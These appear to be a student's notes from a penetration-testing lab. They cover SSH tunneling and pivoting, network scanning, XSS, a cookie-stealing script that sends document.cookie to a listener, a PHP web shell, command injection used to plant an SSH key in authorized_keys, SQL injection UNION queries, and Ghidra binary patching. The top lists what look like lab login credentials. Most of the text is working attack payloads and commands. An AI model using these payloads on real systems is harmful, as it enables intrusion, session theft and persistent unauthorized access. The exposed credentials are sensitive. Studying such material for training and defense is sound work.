#### Login Info
Stack#: 10
Username: DAHA-019-M
Password: oybOV5rOD7Jo
Jump: 10.50.15.68
winops: 10.50.152.93
# Operations and Scanning
Open source intel:
social medial, linkdin, whois
### Active Enumerations
#### nmap scripts
    ls /usr/share/nmap/scripts
### Control Sockets
Authenticate to JUmp box, -S create socket file to store socket s, -M uses multiplexing, Kepp this open or the connection will die. up to 17 hops deep only unising a single connection
### Create master socket:
    ssh -MS /tmp/jump student@10.50.15.68 (own ip)
    ssh -MS /tmp/demo demo1@10.50.14.70 (demo ip)

## After moving to a new box do a ping sweep:
    for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from"&); done

Scan for ports on listed on hosts
### set up dynamic tunnel:
        ssh -S /tmp/demo demo -O forward -D 9050
Proxychains nmap (taget ip) 
verify port
proxychains nc (targetip) (taget port)
### to close the dynamic tunnel
        ssh -S /tmp/demo demo -O cancel -D 9050
### Add listenting port forward
    ssh -S /tmp/demo demo -O forward -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
### Remove port forward
    ssh -S /tmp/demo demo -O cancel -L1111:192.168.28.100:80 -L 1112:192.168.28.100:2222
#### verify port is open/banner grab
    ss -ntlp | grep (port number)
## Example on how to Master socket between mulitple hosts

        ssh -MS /tmp/jump jump student@ip
        ssh -S /tmp/jump jump -O  forward -D 9050
        ssh -S /tmp/jump jump -L 1111:1.2.3.4:80 -L 1112:1.2.3.4:22

        ssh -ms /tmp/t1 cred@127.0.0.1 -p 1112
        ssh -S /tmp/jump jump -O cancel -D 9050 >>> ssh -s /tmp/t1 t1 -O farward -D 9050
        ssh -s  /tmp/t1 t1 -O forward -L 2111:2.3.4.5:22 -L 2112:2.3.4.5:80

# Web Exploitation
## Enumeration of a web server
### /robots.txt 
    allows you to see all websites within webserver that can all be searched for info
    http://127.0.0.1/robots.txt
### http-enum.nse
    A scirpt that can be used with nmao to enum the website off a webserver
    nmap --scripts=http-enum.nse <ip>
## Methods of site traversal
### Inspect websever / Console
        changeText()

### Cross-site scripting (XSS)
        <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
        setup nc -l on machine
#### Coookie Stealer
        <script>document.location="http://<ip of nc listener:port>/Cookie_Stealer1.php?username=" + document.cookie;</script>
set up nc 
### stored javascript components 
        <script>alert('XSS');</script>
### ../
        
### malicous file upload
    <HTML><BODY>
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <?php
    if($_GET['cmd']) {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </BODY></HTML>
### Command injection
use semicolons in test boxes on the webserver
##ssh key upload
### generate our key
    ssh-keygen -t rsa -b 4096
    No Passphrase
    cat /home/student/.ssh/id_rsa.pub

    #copy and paste the WHOLE key
### Prepare website > cmd injection > know users and home directories (/etc/passwd)
#### make /.ssh in the users home directory
    ;mkdir <Users Home Direcotry>/.ssh
    ;ls -la <Users Home Direcotry>

### upload key
    ;echo "ssh key" >> <User Home Directory>/.ssh/authorized_keys
    ;cat <User Home Direcotry>/.ssh/authorized_keys
### ssh into machine
        ssh -i /home/student/www/.ssh/id_rsa <username>@127.0.0.1 - p <port opened>
        
    
# SQL Injection
    SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
### To Test if Vulnerable
       ' OR 1='1 in User Name and psswd
       / are sign of input field sanitization aka no vulnerable
check network while inspecting element, request tab for the post request, take raw request, add a "?"then copy and paste the raw link into the url
### to enter sql server
    mysql
    show data; -show  database
    information_schema; -shows useful info
    use inforamtion_schema; enter database
    show tables ;
    show columns from columns;
## Golden Statement snf syntac
    UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
    <Name of Column>,<Name of Column>,<Name of Column>, FROM <NAME OF DATABASE>,<NAME OF TABLE>

## craft QUery
    SELECT <column,names> from database.columnname
    
## step 1 Identify Vulnerbale Field
## step 2 Identify Number of Columns
match Number of options to the number columns
    Audi' UNION SELECT 1,2,3,4,5 #

## step 3 Edit Golden Statement
    Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns
Added 2 and the 5 becuase the server side query did not display the second selection
## step 4 Craft Queries
    Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #
### Get REquest in the URL
in the URL AFter Selection=1 OR 1=1
cahnge selection number until info shows up

## Step one, Identify vulnerable selection
    Selection=1 or 1=1
    selection=2 or 1=1
## Step Two Identify number of Columns
    Selection=2 UNION SELECT 1,2,3
## Step 3 Edit Golden Statement
    UNION SELECT table_schema,column_name,table_name from information_schema.columns
## Step 4 Caft a query

    Union SELECT name,type,cost from session.car 
    @@version to see version of sql 

    #TEST  OUT VULNERBALE FIELDS WITH ' to see if they auto close
    'Hacker', 'DIG', 'Hacker','password','password@username',1) #'


# REverse Engineering
## Dissasembly
Open Ghidra > file > New Project > Non-shared
File > import file > selct.exe > double click imported file 

Search > strings: > work from the end m seach for success

##patching
work backwards, look for success > 
right click > patch intructions
File > Export 
